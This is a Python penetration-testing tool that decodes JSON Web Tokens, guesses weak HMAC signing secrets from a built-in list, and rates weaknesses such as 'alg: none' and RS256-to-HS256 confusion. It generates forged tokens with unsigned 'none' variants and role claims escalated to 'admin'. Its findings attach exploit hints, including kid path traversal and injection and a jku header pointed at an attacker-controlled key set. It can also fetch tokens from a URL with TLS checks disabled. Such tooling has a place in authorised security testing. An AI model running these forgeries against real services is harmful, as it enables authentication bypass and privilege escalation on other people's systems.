#!/usr/bin/env python3
"""
JWT Analyzer & Forger — Decode, analyze, and test JWT tokens for vulnerabilities
Usage: python3 jwt_analyzer.py <token_or_url>
"""

import sys
import json
import base64
import hmac
import hashlib
import time
import requests
from collections import OrderedDict

requests.packages.urllib3.disable_warnings()

def b64_decode(s):
    """Decode base64url"""
    s += '=' * (4 - len(s) % 4)
    return base64.urlsafe_b64decode(s)

def b64_encode(b):
    """Encode to base64url"""
    return base64.urlsafe_b64encode(b).rstrip(b'=').decode()

def decode_jwt(token):
    """Decode JWT without verification"""
    parts = token.split('.')
    if len(parts) != 3:
        return None
    
    try:
        header = json.loads(b64_decode(parts[0]))
        payload = json.loads(b64_decode(parts[1]))
        return {
            "header": header,
            "payload": payload,
            "signature": parts[2],
            "raw": parts
        }
    except:
        return None

def forge_jwt(header, payload, secret=""):
    """Forge a JWT with given secret"""
    h = b64_encode(json.dumps(header).encode())
    p = b64_encode(json.dumps(payload).encode())
    
    if secret:
        msg = f"{h}.{p}".encode()
        sig = hmac.new(secret.encode(), msg, hashlib.sha256).digest()
        s = b64_encode(sig)
    else:
        s = ""
    
    return f"{h}.{p}.{s}"

def analyze_vulnerabilities(decoded):
    """Analyze JWT for common vulnerabilities"""
    vulns = []
    header = decoded["header"]
    payload = decoded["payload"]
    sig = decoded["signature"]
    
    # 1. Algorithm confusion (alg: none)
    alg = header.get("alg", "")
    if alg.lower() in ["none", "null", "nil", "undefined"]:
        vulns.append({
            "severity": "CRITICAL",
            "type": "Algorithm None",
            "description": "JWT uses 'none' algorithm — no signature verification!",
            "exploit": "Remove signature: header.payload.",
            "cvss": "9.8"
        })
    
    # 2. HS256 with weak secrets
    if alg.startswith("HS"):
        vulns.append({
            "severity": "HIGH",
            "type": "HMAC Algorithm",
            "description": f"Uses {alg} — vulnerable to algorithm confusion if server also accepts RS256",
            "exploit": "Try: change alg to HS256, sign with public key as secret",
            "cvss": "8.1"
        })
        
        # Try common secrets
        common_secrets = [
            "secret", "password", "123456", "admin", "key", "test",
            "jwt_secret", "changeme", "default", "supersecret",
            "your-256-bit-secret", "mysecret", "jwt-secret",
            "HS256-secret", "token-secret", "api-secret",
            "a]secret", "null", "undefined", "false", "true",
            "1", "0", " ", "", "none",
        ]
        
        msg = f"{decoded['raw'][0]}.{decoded['raw'][1]}".encode()
        for secret in common_secrets:
            try:
                expected = hmac.new(secret.encode(), msg, hashlib.sha256).digest()
                expected_b64 = b64_encode(expected)
                if expected_b64 == sig:
                    vulns.append({
                        "severity": "CRITICAL",
                        "type": "Weak Secret",
                        "description": f"JWT signed with weak secret: '{secret}'",
                        "exploit": f"Forge any token with secret: '{secret}'",
                        "cvss": "9.8"
                    })
                    break
            except:
                pass
    
    # 3. RS256 → HS256 confusion
    if alg == "RS256":
        vulns.append({
            "severity": "HIGH",
            "type": "Algorithm Confusion (RS256→HS256)",
            "description": "RS256 can be confused with HS256 if server uses same key for both",
            "exploit": "Sign with HS256 using the public key as secret",
            "cvss": "8.1"
        })
    
    # 4. Missing expiration
    if "exp" not in payload:
        vulns.append({
            "severity": "MEDIUM",
            "type": "No Expiration",
            "description": "JWT has no expiration claim — never expires!",
            "exploit": "Token valid forever if not revoked",
            "cvss": "5.3"
        })
    else:
        exp = payload["exp"]
        if isinstance(exp, (int, float)):
            if exp > time.time() + 86400 * 365:
                vulns.append({
                    "severity": "MEDIUM",
                    "type": "Long Expiration",
                    "description": f"JWT expires in {int((exp - time.time()) / 86400)} days — too long",
                    "exploit": "Extended window for token theft",
                    "cvss": "4.3"
                })
            if exp < time.time():
                vulns.append({
                    "severity": "INFO",
                    "type": "Expired Token",
                    "description": "JWT is expired — check if server validates expiration",
                    "exploit": "Try using expired token — server may not check",
                    "cvss": "3.1"
                })
    
    # 5. Sensitive data in payload
    sensitive_keys = [
        "password", "secret", "api_key", "apikey", "token", "private",
        "credit_card", "ssn", "social_security", "dob", "address",
        "phone", "email", "admin", "role", "is_admin", "is_administrator"
    ]
    for key in sensitive_keys:
        if key in payload:
            vulns.append({
                "severity": "MEDIUM",
                "type": "Sensitive Data in JWT",
                "description": f"JWT payload contains '{key}': {str(payload[key])[:50]}",
                "exploit": "JWT payload is readable by anyone — not encrypted",
                "cvss": "5.3"
            })
    
    # 6. Admin/role claims
    role_claims = ["role", "is_admin", "admin", "isAdmin", "privilege", "level", "access_level"]
    for claim in role_claims:
        if claim in payload:
            vulns.append({
                "severity": "HIGH",
                "type": "Role Claim in JWT",
                "description": f"JWT contains role claim '{claim}' = '{payload[claim]}'",
                "exploit": f"Try changing '{claim}' to 'admin' and re-signing",
                "cvss": "7.5"
            })
    
    # 7. jku/x5u header injection
    if "jku" in header or "x5u" in header:
        vulns.append({
            "severity": "CRITICAL",
            "type": "Key URL Injection",
            "description": f"JWT header contains key URL: {header.get('jku') or header.get('x5u')}",
            "exploit": "Point jku/x5u to attacker-controlled JWKS",
            "cvss": "9.8"
        })
    
    # 8. kid injection
    if "kid" in header:
        kid = header["kid"]
        vulns.append({
            "severity": "HIGH",
            "type": "Key ID (kid) Present",
            "description": f"JWT header 'kid': {kid}",
            "exploit": "Try: kid=path traversal (../../dev/null), SQL injection, or command injection",
            "cvss": "8.1"
        })
    
    # 9. Missing issuer/audience validation
    if "iss" not in payload:
        vulns.append({
            "severity": "LOW",
            "type": "No Issuer Claim",
            "description": "JWT has no issuer claim — server may not validate issuer",
            "exploit": "Token could be forged by any issuer",
            "cvss": "3.1"
        })
    
    if "aud" not in payload:
        vulns.append({
            "severity": "LOW",
            "type": "No Audience Claim",
            "description": "JWT has no audience claim — token accepted by any service",
            "exploit": "Token not bound to specific audience",
            "cvss": "3.1"
        })
    
    return vulns

def generate_forged_tokens(decoded):
    """Generate forged JWT variants for testing"""
    tokens = []
    header = decoded["header"].copy()
    payload = decoded["payload"].copy()
    
    # 1. alg: none
    h_none = header.copy()
    h_none["alg"] = "none"
    tokens.append({
        "name": "Algorithm None",
        "token": forge_jwt(h_none, payload, ""),
        "description": "No signature — try if server accepts"
    })
    
    # 2. alg: none (various)
    for none_val in ["None", "NONE", "nOnE", "null", "Null", "NULL"]:
        h = header.copy()
        h["alg"] = none_val
        tokens.append({
            "name": f"alg={none_val}",
            "token": forge_jwt(h, payload, ""),
            "description": f"Algorithm set to '{none_val}'"
        })
    
    # 3. Role escalation (if role claims exist)
    role_claims = ["role", "is_admin", "admin", "isAdmin", "privilege", "level"]
    for claim in role_claims:
        if claim in payload:
            p_admin = payload.copy()
            p_admin[claim] = "admin"
            tokens.append({
                "name": f"{claim}=admin",
                "token": forge_jwt(header, p_admin, ""),
                "description": f"Changed {claim} to 'admin'"
            })
            p_admin2 = payload.copy()
            p_admin2[claim] = True
            tokens.append({
                "name": f"{claim}=true",
                "token": forge_jwt(header, p_admin2, ""),
                "description": f"Changed {claim} to true"
            })
    
    # 4. alg confusion
    if header.get("alg") == "RS256":
        h_hs = header.copy()
        h_hs["alg"] = "HS256"
        tokens.append({
            "name": "RS256→HS256",
            "token": forge_jwt(h_hs, payload, ""),
            "description": "Changed RS256 to HS256 (needs public key to sign)"
        })
    
    return tokens

def analyze_token(token):
    """Full JWT analysis"""
    decoded = decode_jwt(token)
    if not decoded:
        print("❌ Invalid JWT token")
        return
    
    print(f"\n{'='*60}")
    print(f"🔐 JWT Analyzer & Forger")
    print(f"{'='*60}")
    
    # Decode
    print(f"\n📋 HEADER:")
    print(json.dumps(decoded["header"], indent=2))
    
    print(f"\n📋 PAYLOAD:")
    print(json.dumps(decoded["payload"], indent=2))
    
    sig_preview = decoded["signature"][:30] + "..." if len(decoded["signature"]) > 30 else decoded["signature"]
    print(f"\n📋 SIGNATURE: {sig_preview}")
    
    # Analyze
    vulns = analyze_vulnerabilities(decoded)
    
    if vulns:
        print(f"\n{'='*60}")
        print(f"⚠️  VULNERABILITIES FOUND: {len(vulns)}")
        print(f"{'='*60}")
        
        for v in vulns:
            sev_icon = {"CRITICAL": "🔴", "HIGH": "🟠", "MEDIUM": "🟡", "LOW": "🟢", "INFO": "⚪"}
            icon = sev_icon.get(v["severity"], "⚪")
            print(f"\n{icon} [{v['severity']}] {v['type']}")
            print(f"   {v['description']}")
            print(f"   💡 Exploit: {v['exploit']}")
            print(f"   📊 CVSS: {v['cvss']}")
    else:
        print("\n✅ No obvious vulnerabilities found")
    
    # Generate forged tokens
    forged = generate_forged_tokens(decoded)
    if forged:
        print(f"\n{'='*60}")
        print(f"🔧 FORGED TOKENS FOR TESTING: {len(forged)}")
        print(f"{'='*60}")
        for f in forged:
            print(f"\n  [{f['name']}]")
            print(f"  Token: {f['token'][:80]}...")
            print(f"  Description: {f['description']}")
    
    # Save
    import os
    os.makedirs("output", exist_ok=True)
    outfile = f"output/jwt_analysis_{int(time.time())}.json"
    with open(outfile, "w") as f:
        json.dump({
            "decoded": decoded,
            "vulnerabilities": vulns,
            "forged_tokens": forged
        }, f, indent=2, default=str)
    print(f"\n💾 Saved to {outfile}")

def extract_from_url(url):
    """Try to extract JWT from URL response"""
    try:
        r = requests.get(url, timeout=10, verify=False, headers={"User-Agent": "Mozilla/5.0"})
        
        # Check headers
        for h in ["Authorization", "X-Auth-Token", "X-JWT-Token", "Set-Cookie"]:
            val = r.headers.get(h, "")
            if "eyJ" in val:
                token = val.split("eyJ")[-1]
                return "eyJ" + token.split(".")[0] + "." + ".".join(token.split(".")[1:])
        
        # Check body
        import re
        jwt_pattern = r'(eyJ[A-Za-z0-9_-]+\.eyJ[A-Za-z0-9_-]+\.[A-Za-z0-9_-]+)'
        matches = re.findall(jwt_pattern, r.text)
        if matches:
            return matches[0]
        
        # Check cookies
        for cookie in r.cookies:
            if "eyJ" in str(cookie.value):
                return cookie.value
        
        return None
    except:
        return None

if __name__ == "__main__":
    if len(sys.argv) < 2:
        print("Usage: python3 jwt_analyzer.py <jwt_token_or_url>")
        print("Example: python3 jwt_analyzer.py eyJhbGciOiJIUzI1NiJ9.eyJzdWIiOiIxMjM0NTY3ODkwIn0.xxx")
        sys.exit(1)
    
    target = sys.argv[1]
    
    if target.startswith("http"):
        print(f"🔍 Extracting JWT from {target}...")
        token = extract_from_url(target)
        if token:
            analyze_token(token)
        else:
            print("❌ No JWT found in response")
    else:
        analyze_token(target)
